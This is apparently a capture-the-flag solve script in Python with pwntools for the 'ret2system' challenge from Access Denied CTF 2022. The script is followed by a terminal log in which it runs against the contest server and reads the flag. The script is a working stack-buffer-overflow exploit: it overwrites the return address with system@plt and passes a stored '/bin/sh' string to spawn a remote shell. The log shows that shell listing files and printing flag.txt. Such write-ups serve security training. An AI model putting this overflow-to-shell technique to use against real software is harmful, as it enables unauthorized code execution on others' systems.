from pwn import *

#context(os='linux', arch='i386')
#context.log_level = 'debug'

BINARY = './ret2system'
elf  = ELF(BINARY)

if len(sys.argv) > 1 and sys.argv[1] == 'r':
  HOST = "34.134.85.196"
  PORT = 9337
  s = remote(HOST, PORT)
else:
  s = process(BINARY)

s.recvuntil("You are allowed to store some value\n")
s.sendline("/bin/sh\x00")

s.recvuntil("Enter the buffer now\n")

system_plt = 0x80490e0

buf  = "A"*44
buf += p32(system_plt)
buf += "BBBB"
buf += p32(elf.sym.store)
s.sendline(buf)

s.interactive()

'''
mito@ubuntu:~/CTF/Access_Denied_CTF_2022/Pwn_ret2system/ret2system$ python solve.py r
[*] '/home/mito/CTF/Access_Denied_CTF_2022/Pwn_ret2system/ret2system/ret2system'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
[+] Opening connection to 34.134.85.196 on port 9337: Done
[*] Switching to interactive mode
$ id
/bin/sh: 1: id: not found
$ ls -l
total 44
drwxr-x--- 1 0 1000  4096 Jun  9 02:09 bin
drwxr-x--- 1 0 1000  4096 Jun  9 02:09 dev
-rwxr----- 1 0 1000    70 Jun  9 02:15 flag.txt
drwxr-x--- 1 0 1000  4096 Jun  9 02:08 lib
drwxr-x--- 1 0 1000  4096 Jun  9 02:08 lib32
drwxr-x--- 1 0 1000  4096 Jun  9 02:08 lib64
drwxr-x--- 1 0 1000  4096 Jun  9 02:08 libx32
-rwxr-x--- 1 0 1000 15708 Jun  8 06:42 ret2system
$ cat flag.txt
accessdenied{n3xt_1_w1ll_n0t_1nclud3_system_func710n_1t53lf_e8dd6fc7}
'''
